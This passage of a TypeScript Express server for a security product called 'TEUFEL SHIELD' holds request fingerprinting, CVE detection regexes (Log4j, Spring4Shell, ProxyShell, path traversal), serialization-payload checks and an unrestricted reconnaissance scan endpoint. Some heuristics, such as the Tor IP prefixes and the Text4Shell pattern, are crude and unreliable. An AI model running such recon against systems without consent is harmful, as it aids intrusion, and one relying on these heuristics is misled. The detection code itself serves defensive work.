      ip: ip || "unknown",
      timestamp: new Date().toISOString(),
      components: {
        userAgent: userAgent || "unknown",
        acceptLanguage: headers?.["accept-language"] || "unknown",
        acceptEncoding: headers?.["accept-encoding"] || "unknown",
        connection: headers?.["connection"] || "unknown",
        accept: headers?.["accept"] || "unknown",
      },
      analysis: {
        isAutomated: false,
        isTor: false,
        isProxy: false,
        isVpn: false,
        isMobile: false,
        browserFamily: "unknown",
        osFamily: "unknown",
      },
      riskIndicators: [] as string[],
      trustScore: 100,
    };
    
    // Analyze user agent
    const ua = (userAgent || "").toLowerCase();
    
    // Detect automation tools
    const automationSignatures = ["curl", "wget", "python", "java", "go-http", "httpie", "axios", "node-fetch", "scrapy", "selenium", "phantom", "headless"];
    for (const sig of automationSignatures) {
      if (ua.includes(sig)) {
        fingerprint.analysis.isAutomated = true;
        fingerprint.riskIndicators.push(`Automated tool: ${sig}`);
        fingerprint.trustScore -= 30;
        break;
      }
    }
    
    // Detect browser family
    if (ua.includes("chrome")) fingerprint.analysis.browserFamily = "Chrome";
    else if (ua.includes("firefox")) fingerprint.analysis.browserFamily = "Firefox";
    else if (ua.includes("safari")) fingerprint.analysis.browserFamily = "Safari";
    else if (ua.includes("edge")) fingerprint.analysis.browserFamily = "Edge";
    else if (ua.includes("opera")) fingerprint.analysis.browserFamily = "Opera";
    
    // Detect OS
    if (ua.includes("windows")) fingerprint.analysis.osFamily = "Windows";
    else if (ua.includes("mac")) fingerprint.analysis.osFamily = "macOS";
    else if (ua.includes("linux")) fingerprint.analysis.osFamily = "Linux";
    else if (ua.includes("android")) { fingerprint.analysis.osFamily = "Android"; fingerprint.analysis.isMobile = true; }
    else if (ua.includes("iphone") || ua.includes("ipad")) { fingerprint.analysis.osFamily = "iOS"; fingerprint.analysis.isMobile = true; }
    
    // Check for missing headers (bot indicator)
    if (!headers?.["accept-language"]) {
      fingerprint.riskIndicators.push("Missing Accept-Language header");
      fingerprint.trustScore -= 15;
    }
    if (!headers?.["accept-encoding"]) {
      fingerprint.riskIndicators.push("Missing Accept-Encoding header");
      fingerprint.trustScore -= 10;
    }
    
    // Check for Tor/VPN indicators
    const torExits = ["185.220", "23.129", "45.33", "51.75", "62.102", "77.247", "91.121", "94.23", "185.100"];
    for (const torRange of torExits) {
      if (ip?.startsWith(torRange)) {
        fingerprint.analysis.isTor = true;
        fingerprint.riskIndicators.push("IP matches known Tor exit node range");
        fingerprint.trustScore -= 40;
        break;
      }
    }
    
    fingerprint.trustScore = Math.max(0, fingerprint.trustScore);
    
    res.json(fingerprint);
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // TEUFEL ZERO-DAY SIGNATURE DATABASE (ZERO-DAY-SIGNATUREN!)
  // ═══════════════════════════════════════════════════════════════════════════════
  
  const zeroDaySignatures = [
    { id: "zd-log4j-1", name: "Log4j CVE-2021-44228", pattern: "\\$\\{jndi:", severity: "critical", cve: "CVE-2021-44228" },
    { id: "zd-log4j-2", name: "Log4j Obfuscated", pattern: "\\$\\{[^}]*j[^}]*n[^}]*d[^}]*i", severity: "critical", cve: "CVE-2021-44228" },
    { id: "zd-spring4shell", name: "Spring4Shell", pattern: "class\\.module\\.classLoader", severity: "critical", cve: "CVE-2022-22965" },
    { id: "zd-text4shell", name: "Text4Shell", pattern: "script|dns|url|base64", severity: "high", cve: "CVE-2022-42889" },
    { id: "zd-proxyshell", name: "ProxyShell Exchange", pattern: "autodiscover/autodiscover\\.json", severity: "critical", cve: "CVE-2021-34473" },
    { id: "zd-proxylogon", name: "ProxyLogon Exchange", pattern: "/ecp/DDI/DDIService\\.svc", severity: "critical", cve: "CVE-2021-26855" },
    { id: "zd-confluence", name: "Confluence OGNL", pattern: "ognl\\.OgnlContext|struts2-rest-plugin", severity: "critical", cve: "CVE-2022-26134" },
    { id: "zd-f5", name: "F5 BIG-IP RCE", pattern: "/mgmt/tm/util/bash|/mgmt/shared/authn/login", severity: "critical", cve: "CVE-2022-1388" },
    { id: "zd-vmware", name: "VMware RCE", pattern: "/catalog-portal/ui/|/vcac/|/identity/", severity: "critical", cve: "CVE-2022-22954" },
    { id: "zd-apache-path", name: "Apache Path Traversal", pattern: "\\.\\%2e/|\\%2e\\./|\\./\\.\\./", severity: "high", cve: "CVE-2021-41773" },
    { id: "zd-gitlab", name: "GitLab RCE", pattern: "/uploads/\\.\\.\\/\\.\\.\\/", severity: "critical", cve: "CVE-2021-22205" },
    { id: "zd-grafana", name: "Grafana LFI", pattern: "/public/plugins/.*/\\.\\./", severity: "high", cve: "CVE-2021-43798" },
    { id: "zd-polkit", name: "Polkit Privilege Escalation", pattern: "pkexec|CVE-2021-4034", severity: "critical", cve: "CVE-2021-4034" },
    { id: "zd-zimbra", name: "Zimbra RCE", pattern: "/service/extension/backup/mboximport", severity: "critical", cve: "CVE-2022-41352" },
    { id: "zd-fortinet", name: "FortiOS Auth Bypass", pattern: "/api/v2/cmdb/system/admin", severity: "critical", cve: "CVE-2022-40684" },
  ];
  
  app.get("/api/shield/zero-day-signatures", (req, res) => {
    res.json({
      count: zeroDaySignatures.length,
      lastUpdated: new Date().toISOString(),
      signatures: zeroDaySignatures,
    });
  });
  
  app.post("/api/shield/zero-day-check", (req, res) => {
    const { payload } = req.body;
    
    if (!payload) {
      return res.status(400).json({ error: "Payload required" });
    }
    
    const matches = [];
    
    for (const sig of zeroDaySignatures) {
      try {
        const regex = new RegExp(sig.pattern, 'gi');
        if (regex.test(payload)) {
          matches.push({
            signatureId: sig.id,
            name: sig.name,
            severity: sig.severity,
            cve: sig.cve,
            matched: true,
          });
        }
      } catch (e) {
        // Invalid pattern, skip
      }
    }
    
    res.json({
      payload: payload.substring(0, 100) + (payload.length > 100 ? "..." : ""),
      matchCount: matches.length,
      matches,
      verdict: matches.length > 0 ? "ZERO-DAY ATTACK DETECTED" : "CLEAN",
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // TEUFEL DEEP INSPECTION ENGINE (TIEFENPRÜFUNG!)
  // ═══════════════════════════════════════════════════════════════════════════════
  
  app.post("/api/shield/deep-inspect", async (req, res) => {
    const { request } = req.body;
    
    const inspection = {
      timestamp: new Date().toISOString(),
      layers: {
        http: { analyzed: true, issues: [] as string[] },
        headers: { analyzed: true, issues: [] as string[] },
        body: { analyzed: true, issues: [] as string[] },
        encoding: { analyzed: true, issues: [] as string[] },
        protocol: { analyzed: true, issues: [] as string[] },
      },
      totalIssues: 0,
      severity: "low" as "low" | "medium" | "high" | "critical",
      recommendations: [] as string[],
    };
    
    // HTTP layer inspection
    if (request?.method) {
      const dangerousMethods = ["TRACE", "CONNECT", "OPTIONS", "DEBUG"];
      if (dangerousMethods.includes(request.method.toUpperCase())) {
        inspection.layers.http.issues.push(`Potentially dangerous HTTP method: ${request.method}`);
      }
    }
    
    // Header inspection
    if (request?.headers) {
      // Check for header injection
      for (const [key, value] of Object.entries(request.headers)) {
        if (typeof value === 'string') {
          if (/[\r\n]/.test(value)) {
            inspection.layers.headers.issues.push(`CRLF injection in header: ${key}`);
          }
          if (value.length > 8192) {
            inspection.layers.headers.issues.push(`Oversized header value: ${key} (${value.length} bytes)`);
          }
        }
      }
      
      // Check for suspicious headers
      const suspiciousHeaders = ["x-forwarded-host", "x-original-url", "x-rewrite-url", "x-http-method-override"];
      for (const sh of suspiciousHeaders) {
        if (request.headers[sh]) {
          inspection.layers.headers.issues.push(`Suspicious header present: ${sh}`);
        }
      }
    }
    
    // Body inspection
    if (request?.body) {
      const bodyStr = typeof request.body === 'string' ? request.body : JSON.stringify(request.body);
      
      // Check for serialization attacks
      if (/O:[0-9]+:"/.test(bodyStr)) {
        inspection.layers.body.issues.push("PHP object serialization detected");
      }
      if (/rO0ABX/.test(bodyStr) || /aced0005/.test(bodyStr)) {
        inspection.layers.body.issues.push("Java serialization detected");
      }
      if (/__reduce__|pickle/.test(bodyStr)) {
        inspection.layers.body.issues.push("Python pickle serialization detected");
      }
      
      // Check for file uploads with dangerous extensions
      if (/\.(php|jsp|asp|aspx|exe|sh|bat|cmd|ps1)(\s|"|'|$)/i.test(bodyStr)) {
        inspection.layers.body.issues.push("Dangerous file extension in body");
      }
    }
    
    // Encoding inspection
    const fullRequest = JSON.stringify(request);
    if (/%252f|%252e|%00|\\x00/.test(fullRequest)) {
      inspection.layers.encoding.issues.push("Malicious encoding detected");
    }
    
    // Calculate totals
    Object.values(inspection.layers).forEach(layer => {
      inspection.totalIssues += layer.issues.length;
    });
    
    if (inspection.totalIssues >= 5) inspection.severity = "critical";
    else if (inspection.totalIssues >= 3) inspection.severity = "high";
    else if (inspection.totalIssues >= 1) inspection.severity = "medium";
    
    // Generate recommendations
    if (inspection.layers.headers.issues.length > 0) {
      inspection.recommendations.push("Implement strict header validation");
    }
    if (inspection.layers.body.issues.length > 0) {
      inspection.recommendations.push("Enable request body sanitization");
    }
    if (inspection.layers.encoding.issues.length > 0) {
      inspection.recommendations.push("Normalize and validate all input encodings");
    }
    
    res.json(inspection);
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // TEUFEL ATTACK CORRELATION ENGINE (ANGRIFFS-KORRELATION!)
  // ═══════════════════════════════════════════════════════════════════════════════
  
  app.get("/api/shield/attack-correlation", async (req, res) => {
    try {
      const threats = await shieldDb().select().from(dbThreatLogs).orderBy(dbThreatLogs.timestamp);
      
      // Group threats by IP
      const byIp = new Map<string, typeof threats>();
      for (const threat of threats) {
        if (!byIp.has(threat.sourceIp)) {
          byIp.set(threat.sourceIp, []);
        }
        byIp.get(threat.sourceIp)!.push(threat);
      }
      
      // Group threats by type
      const byType = new Map<string, number>();
      for (const threat of threats) {
        byType.set(threat.type, (byType.get(threat.type) || 0) + 1);
      }
      
      // Identify attack campaigns (multiple attack types from same IP)
      const campaigns = [];
      for (const [ip, ipThreats] of byIp) {
        const types = new Set(ipThreats.map(t => t.type));
        if (types.size >= 3 || ipThreats.length >= 10) {
          campaigns.push({
            ip,
            threatCount: ipThreats.length,
            attackTypes: Array.from(types),
            firstSeen: ipThreats[0]?.timestamp,
            lastSeen: ipThreats[ipThreats.length - 1]?.timestamp,
            severity: types.size >= 5 ? "critical" : types.size >= 3 ? "high" : "medium",
          });
        }
      }
      
      res.json({
        totalThreats: threats.length,
        uniqueIPs: byIp.size,
        attackTypes: Object.fromEntries(byType),
        identifiedCampaigns: campaigns.length,
        campaigns: campaigns.slice(0, 10),
        topAttackedTypes: Array.from(byType.entries())
          .sort((a, b) => b[1] - a[1])
          .slice(0, 5)
          .map(([type, count]) => ({ type, count })),
      });
    } catch (error) {
      res.status(500).json({ error: "Database error" });
    }
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // RECONIC - AUTOMATED RECONNAISSANCE FRAMEWORK
  // ═══════════════════════════════════════════════════════════════════════════

  // Active Reconic scans storage
  const reconicScans = new Map<string, {
    id: string;
    target: string;
    status: "running" | "completed" | "error";
    startTime: string;
    endTime?: string;
    results?: any;
    error?: string;
    logs: string[];
  }>();

  // Start Reconic reconnaissance scan
  app.post("/api/reconic/scan", async (req, res) => {
    try {
      const { target, options } = req.body;

      if (!target || typeof target !== "string") {
        return res.status(400).json({ error: "Target URL is required" });
      }

      // Validate target URL
      let targetUrl = target.trim();
      if (!targetUrl.startsWith("http")) {
        targetUrl = "https://" + targetUrl;
      }

      try {
        new URL(targetUrl);
      } catch {
        return res.status(400).json({ error: "Invalid URL format" });
      }

      const scanId = randomUUID();
      const scanRecord = {
        id: scanId,
        target: targetUrl,
        status: "running" as const,
        startTime: new Date().toISOString(),
        results: null as any,
        logs: [] as string[],
      };
      reconicScans.set(scanId, scanRecord);

      // Spawn Reconic process
      const optionsJson = JSON.stringify(options || {});
      const reconicProcess = spawn("python3", [
        "/opt/gapp/reconic/run_reconic.py",
        targetUrl,
        optionsJson,
      ], {
        cwd: "/opt/gapp/reconic",
        env: {
          ...process.env,
          PATH: `${process.env.PATH}:/root/go/bin:/usr/local/bin`,
        },
      });

      let stdout = "";
      let stderr = "";

      reconicProcess.stdout.on("data", (data: Buffer) => {
        const text = data.toString();
        stdout += text;
        // Parse log lines for real-time updates
        text.split("\n").forEach((line: string) => {
          if (line.trim()) {
            scanRecord.logs.push(line.trim());
          }
        });
      });

      reconicProcess.stderr.on("data", (data: Buffer) => {
        stderr += data.toString();
      });

      reconicProcess.on("close", (code: number) => {
        const scan = reconicScans.get(scanId);
        if (!scan) return;

        scan.endTime = new Date().toISOString();

        if (code === 0) {
          // Parse results from stdout
          const resultMarker = "__RECONIC_RESULT__";
          const markerIdx = stdout.indexOf(resultMarker);
          if (markerIdx !== -1) {
            try {
              const jsonStr = stdout.substring(markerIdx + resultMarker.length).trim();
              scan.results = JSON.parse(jsonStr);
              scan.status = "completed";
            } catch {
              scan.status = "error";
              scan.error = "Failed to parse scan results";
            }
          } else {
            scan.status = "error";
            scan.error = "No results returned from Reconic";
          }
        } else {
          scan.status = "error";
          scan.error = stderr || `Process exited with code ${code}`;
        }
      });

      res.json({
        scanId,
        target: targetUrl,
        status: "running",
        message: "Reconic reconnaissance scan started",
      });

    } catch (error: any) {
      res.status(500).json({ error: error.message || "Internal server error" });
    }
  });

  // Get Reconic scan status/results
  app.get("/api/reconic/scan/:scanId", async (req, res) => {
    const scan = reconicScans.get(req.params.scanId);
    if (!scan) {
      return res.status(404).json({ error: "Scan not found" });
    }
    res.json(scan);
  });

  // Stream Reconic scan logs via SSE
  app.get("/api/reconic/scan/:scanId/stream", async (req, res) => {
    const scanId = req.params.scanId;
    const scan = reconicScans.get(scanId);

    if (!scan) {
      return res.status(404).json({ error: "Scan not found" });
    }

    res.writeHead(200, {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-cache",
      Connection: "keep-alive",
    });

    let lastLogIdx = 0;

    const interval = setInterval(() => {
      const currentScan = reconicScans.get(scanId);
      if (!currentScan) {
        clearInterval(interval);
        res.end();
        return;
      }

      // Send new log lines
      while (lastLogIdx < currentScan.logs.length) {
        res.write(`data: ${JSON.stringify({ type: "log", message: currentScan.logs[lastLogIdx] })}\n\n`);
        lastLogIdx++;
      }

      // Send status updates
      if (currentScan.status !== "running") {
        res.write(`data: ${JSON.stringify({
          type: "complete",
          status: currentScan.status,
          results: currentScan.results,
          error: currentScan.error,
        })}\n\n`);
        clearInterval(interval);
        setTimeout(() => res.end(), 500);
      }
    }, 1000);

    req.on("close", () => {
      clearInterval(interval);
    });
  });

  // List all Reconic scans
  app.get("/api/reconic/scans", async (_req, res) => {
    const scans = Array.from(reconicScans.values()).map((s) => ({
      id: s.id,
      target: s.target,
      status: s.status,
      startTime: s.startTime,
      endTime: s.endTime,
      subdomainCount: s.results?.subdomains?.length || 0,
      aliveHostCount: s.results?.alive_hosts?.length || 0,
      endpointCount: s.results?.endpoints?.length || 0,
      takeoverCount: s.results?.takeovers?.length || 0,
    }));
    res.json({ scans });
  });

  // Generate Reconic PDF report
  app.post("/api/reconic/report", async (req, res) => {
    try {
      const { scanId } = req.body;
      const scan = reconicScans.get(scanId);

      if (!scan || !scan.results) {
        return res.status(404).json({ error: "Scan results not found" });
      }

      const PDFDocument = (await import("pdfkit")).default;
      const doc = new PDFDocument({ size: "A4", margin: 50 });
      const buffers: Buffer[] = [];

      doc.on("data", (chunk: Buffer) => buffers.push(chunk));
      doc.on("end", () => {
        const pdfBuffer = Buffer.concat(buffers);
        res.setHeader("Content-Type", "application/pdf");
        res.setHeader("Content-Disposition", `attachment; filename="GAP-Reconic-Report-${scan.target.replace(/[^a-zA-Z0-9]/g, "_")}.pdf"`);
        res.send(pdfBuffer);
      });

      const r = scan.results;
      const navy = "#0A1628";
      const accent = "#00D4FF";
      const red = "#FF3B3B";
      const green = "#00D68F";
      const yellow = "#FFB800";

      // Header with logo
      const logoPath = "/opt/gapp/dist/public/gap-og.png";
      try {
        const fs = await import("fs");
        if (fs.existsSync(logoPath)) {
          doc.image(logoPath, 50, 35, { width: 80 });
        }
      } catch {}

      doc.fillColor(navy).fontSize(24).font("Helvetica-Bold")
        .text("RECONNAISSANCE REPORT", 145, 45);
      doc.fontSize(12).font("Helvetica").fillColor("#666")
        .text("TEUFEL SHIELD - Automated Recon Framework", 145, 75);

      doc.moveTo(50, 110).lineTo(545, 110).strokeColor(accent).lineWidth(2).stroke();

      // Target info
      let y = 125;
      doc.fillColor(navy).fontSize(14).font("Helvetica-Bold").text("Target Information", 50, y);
      y += 25;
      doc.fontSize(10).font("Helvetica");
      doc.fillColor("#333").text(`Target: ${r.target || scan.target}`, 60, y);
      y += 18;
      doc.text(`Scan Date: ${new Date(r.scan_date || scan.startTime).toLocaleString()}`, 60, y);
      y += 18;
      doc.text(`Duration: ${scan.endTime ? Math.round((new Date(scan.endTime).getTime() - new Date(scan.startTime).getTime()) / 1000) + "s" : "N/A"}`, 60, y);
      y += 30;

      // Summary boxes
      const boxWidth = 115;
      const boxData = [
        { label: "Subdomains", value: r.subdomains?.length || 0, color: accent },
        { label: "Alive Hosts", value: r.alive_hosts?.length || 0, color: green },
        { label: "Endpoints", value: r.endpoints?.length || 0, color: yellow },
        { label: "Takeovers", value: r.takeovers?.length || 0, color: r.takeovers?.length > 0 ? red : green },
      ];

      boxData.forEach((box, i) => {
        const x = 50 + i * (boxWidth + 12);
        doc.roundedRect(x, y, boxWidth, 60, 5).fillColor(box.color).fillOpacity(0.1).fill();
        doc.fillOpacity(1).fillColor(box.color).fontSize(24).font("Helvetica-Bold")
          .text(String(box.value), x, y + 8, { width: boxWidth, align: "center" });
        doc.fillColor("#333").fontSize(9).font("Helvetica")
          .text(box.label, x, y + 40, { width: boxWidth, align: "center" });
      });
      y += 80;

      // Tools used
      doc.fillColor(navy).fontSize(14).font("Helvetica-Bold").text("Tools Used", 50, y);
      y += 22;
      if (r.tools_used) {
        Object.entries(r.tools_used).forEach(([tool, available]) => {
          const icon = available ? "✓" : "✗";
          const color = available ? green : "#999";
          doc.fillColor(color).fontSize(10).font("Helvetica").text(`  ${icon}  ${tool}`, 60, y);
          y += 16;
        });
      }
      y += 15;

      // Subdomains
      if (r.subdomains && r.subdomains.length > 0) {
        if (y > 650) { doc.addPage(); y = 50; }
        doc.fillColor(navy).fontSize(14).font("Helvetica-Bold").text(`Subdomains Discovered (${r.subdomains.length})`, 50, y);
        y += 22;
        const maxSubs = Math.min(r.subdomains.length, 40);
        for (let i = 0; i < maxSubs; i++) {
          if (y > 750) { doc.addPage(); y = 50; }
          doc.fillColor("#333").fontSize(9).font("Helvetica").text(`  • ${r.subdomains[i]}`, 60, y);
          y += 14;
        }
        if (r.subdomains.length > 40) {
          doc.fillColor("#666").fontSize(9).text(`  ... and ${r.subdomains.length - 40} more`, 60, y);
          y += 14;
        }
        y += 10;
      }

      // Alive Hosts
      if (r.alive_hosts && r.alive_hosts.length > 0) {
        if (y > 600) { doc.addPage(); y = 50; }
        doc.fillColor(navy).fontSize(14).font("Helvetica-Bold").text(`Alive Hosts (${r.alive_hosts.length})`, 50, y);
        y += 22;
        const maxHosts = Math.min(r.alive_hosts.length, 30);
        for (let i = 0; i < maxHosts; i++) {
          if (y > 750) { doc.addPage(); y = 50; }
          const host = r.alive_hosts[i];
          const statusCode = host.status_code || host.statusCode || "";
          const title = host.title || "";
          doc.fillColor("#333").fontSize(9).font("Helvetica")
            .text(`  ${host.url || host.host}  [${statusCode}] ${title}`, 60, y, { width: 470 });
          y += 14;
        }
        y += 10;
      }

      // Takeovers
      if (r.takeovers && r.takeovers.length > 0) {
        if (y > 600) { doc.addPage(); y = 50; }
        doc.fillColor(red).fontSize(14).font("Helvetica-Bold").text(`⚠ Subdomain Takeover Vulnerabilities (${r.takeovers.length})`, 50, y);
        y += 22;
        r.takeovers.forEach((t: any) => {
          if (y > 750) { doc.addPage(); y = 50; }
          doc.fillColor(red).fontSize(10).font("Helvetica-Bold").text(`  ${t.subdomain}`, 60, y);
          y += 15;
          doc.fillColor("#333").fontSize(9).font("Helvetica")
            .text(`    CNAME: ${t.cname}  |  Service: ${t.service}`, 70, y);
          y += 18;
        });
        y += 10;
      }

      // Nuclei findings
      if (r.nuclei_findings && r.nuclei_findings.length > 0) {
        if (y > 500) { doc.addPage(); y = 50; }
        doc.fillColor(navy).fontSize(14).font("Helvetica-Bold").text(`Nuclei Vulnerability Findings (${r.nuclei_findings.length})`, 50, y);
        y += 22;
        const maxFindings = Math.min(r.nuclei_findings.length, 25);
        const severityColors: Record<string, string> = {
          critical: red,
          high: "#FF6B6B",
          medium: yellow,
          low: "#4FC3F7",
        };
        for (let i = 0; i < maxFindings; i++) {
          if (y > 720) { doc.addPage(); y = 50; }
          const f = r.nuclei_findings[i];
          const severity = f.info?.severity || "unknown";
          const sevColor = severityColors[String(severity).toLowerCase()] || "#999";
          doc.fillColor(sevColor).fontSize(10).font("Helvetica-Bold")
            .text(`  [${severity.toUpperCase()}] ${f.info?.name || f.template || "Unknown"}`, 60, y);
          y += 15;
          if (f.host || f.matched_at) {
            doc.fillColor("#666").fontSize(8).font("Helvetica")
              .text(`    Host: ${f.matched_at || f.host}`, 70, y);
            y += 12;
          }
          if (f.info?.description) {
            doc.fillColor("#444").fontSize(8).text(`    ${f.info.description.substring(0, 120)}`, 70, y, { width: 460 });
            y += 14;
          }
          y += 5;
        }
      }

      // Footer
      doc.addPage();
      const footerY = 700;
      doc.moveTo(50, footerY).lineTo(545, footerY).strokeColor("#ddd").lineWidth(1).stroke();
      doc.fillColor("#666").fontSize(9).font("Helvetica")
        .text("Report generated by TEUFEL SHIELD - Reconic Reconnaissance Framework", 50, footerY + 10, { align: "center", width: 495 })
        .text("gap-protection.pro | Enterprise Cybersecurity", 50, footerY + 24, { align: "center", width: 495 });

      doc.end();

    } catch (error: any) {
      res.status(500).json({ error: error.message || "Failed to generate report" });
    }
  });

  // Check Reconic tool availability
  app.get("/api/reconic/tools", async (_req, res) => {
    try {
      const { execSync } = await import("child_process");
      const checkTool = (name: string): boolean => {
        try {
          execSync(`which ${name}`, { stdio: "pipe" });
          return true;
        } catch {
          return false;
        }
      };

      res.json({
        tools: {
          subfinder: checkTool("subfinder"),
          httpx: checkTool("httpx"),
          katana: checkTool("katana"),
          nuclei: checkTool("nuclei"),
          amass: checkTool("amass"),
          python3: checkTool("python3"),
          reconic: checkTool("python3") && require("fs").existsSync("/opt/gapp/reconic/reconic.py"),
        },
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  return httpServer;
}

// Generate comprehensive text report
function generateTextReport(scanResult: any): string {
  const lines: string[] = [];
  const divider = "═".repeat(80);
  const thinDivider = "─".repeat(80);
  
  lines.push(divider);
  lines.push("                    TEUFEL SHIELD - VULNERABILITY SCAN REPORT");
  lines.push("                    Enterprise Security Assessment Platform");
  lines.push(divider);
  lines.push("");
  lines.push(`Target URL: ${scanResult.targetUrl}`);
  lines.push(`Scan Date: ${new Date(scanResult.timestamp).toLocaleString()}`);
  lines.push(`Scan Duration: ${scanResult.duration}`);
  lines.push(`Status Code: ${scanResult.status}`);
  lines.push("");
  
  // Server Information
  if (scanResult.serverInfo) {
    lines.push(thinDivider);
    lines.push("SERVER INFORMATION");
    lines.push(thinDivider);
    lines.push(`Server: ${scanResult.serverInfo.server || "Unknown"}`);
    lines.push(`X-Powered-By: ${scanResult.serverInfo.poweredBy || "Unknown"}`);
    lines.push(`Content-Type: ${scanResult.serverInfo.contentType || "Unknown"}`);
    lines.push(`Port: ${scanResult.serverInfo.port || "Unknown"}`);
    if (scanResult.serverInfo.ip) {
      lines.push(`Real IP: ${scanResult.serverInfo.ip}`);
    }
    lines.push("");
  }
  
  // WAF Detection
  if (scanResult.wafDetected && scanResult.wafDetected.length > 0) {
    lines.push(thinDivider);
    lines.push("WAF/PROTECTION DETECTED");
    lines.push(thinDivider);
    scanResult.wafDetected.forEach((waf: string) => {
      lines.push(`[!] ${waf}`);
    });
    lines.push("");
  }
  
  // Summary
  lines.push(thinDivider);
  lines.push("VULNERABILITY SUMMARY");
  lines.push(thinDivider);
  lines.push(`Total Vulnerabilities: ${scanResult.summary?.total || 0}`);
  lines.push(`Critical: ${scanResult.summary?.critical || 0}`);
  lines.push(`High: ${scanResult.summary?.high || 0}`);
  lines.push(`Medium: ${scanResult.summary?.medium || 0}`);
  lines.push(`Low: ${scanResult.summary?.low || 0}`);
  lines.push(`Info: ${scanResult.summary?.info || 0}`);
  lines.push("");
  
  // Vulnerabilities
  if (scanResult.vulnerabilities && scanResult.vulnerabilities.length > 0) {
    lines.push(divider);
    lines.push("DETAILED VULNERABILITY FINDINGS");
    lines.push(divider);
    lines.push("");
    
    scanResult.vulnerabilities.forEach((vuln: any, idx: number) => {
      lines.push(`[${idx + 1}] ${vuln.type.replace(/_/g, " ").toUpperCase()}`);
      lines.push(thinDivider);
      lines.push(`Severity: ${vuln.severity.toUpperCase()}`);
      lines.push(`URL: ${vuln.url}`);
      lines.push(`Description: ${vuln.description}`);
      if (vuln.payload) lines.push(`Payload: ${vuln.payload}`);
      if (vuln.why) lines.push(`Why is this a problem: ${vuln.why}`);
      if (vuln.solution) lines.push(`Solution: ${vuln.solution}`);
      if (vuln.reference) lines.push(`Reference: ${vuln.reference}`);
      if (vuln.poc) lines.push(`PoC: ${vuln.poc}`);
      lines.push("");
    });
  }
  
  // Discovery Results
  if (scanResult.adminPanels && scanResult.adminPanels.length > 0) {
    lines.push(thinDivider);
    lines.push("ADMIN PANELS DISCOVERED");
    lines.push(thinDivider);
    scanResult.adminPanels.forEach((panel: string) => {
      lines.push(`[+] ${panel}`);
    });
    lines.push("");
  }
  
  if (scanResult.backupFiles && scanResult.backupFiles.length > 0) {
    lines.push(thinDivider);
    lines.push("BACKUP FILES DISCOVERED");
    lines.push(thinDivider);
    scanResult.backupFiles.forEach((file: string) => {
      lines.push(`[+] ${file}`);
    });
    lines.push("");
  }
  
  if (scanResult.sensitiveFiles && scanResult.sensitiveFiles.length > 0) {
    lines.push(thinDivider);
    lines.push("SENSITIVE FILES DISCOVERED");
    lines.push(thinDivider);
    scanResult.sensitiveFiles.forEach((file: string) => {
      lines.push(`[+] ${file}`);
    });
    lines.push("");
  }
  
  // Footer
  lines.push(divider);
  lines.push("                    Report generated by TEUFEL SHIELD Scanner v3.0");
  lines.push("                    gap-protection.pro - Enterprise Security");
  lines.push(divider);
  
  return lines.join("\n");
}
